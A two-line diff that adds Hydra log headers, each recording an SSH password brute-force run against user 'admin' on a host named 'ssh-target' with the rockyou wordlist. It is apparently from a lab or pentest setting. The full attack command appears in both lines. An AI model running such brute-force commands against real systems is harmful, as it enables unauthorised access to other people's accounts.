@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2025-06-24 16:15:01 on ssh-target ssh (hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 8 -vV -f -e nsr -o /logs/hydra.txt ssh://ssh-target:22)
+# Hydra v9.5 run at 2025-06-24 16:21:19 on ssh-target ssh (hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 8 -vV -f -e nsr -o /logs/hydra.txt ssh://ssh-target:22)
